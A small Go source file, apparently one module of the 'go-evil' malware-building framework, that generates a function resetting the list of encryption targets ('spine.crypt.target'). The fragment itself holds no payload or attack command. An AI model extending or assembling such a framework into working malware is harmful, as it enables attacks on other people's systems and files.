package target

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/utility/structure"
	"github.com/TeamPhoneix/go-evil/utility/structure/functions"
)

// Removes every previously added target
func Clean(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "clean_targets"

	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
		Parameters: []string{},
		Gut: []string{
			"spine.crypt.target = []string{}",
		}})

	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
}
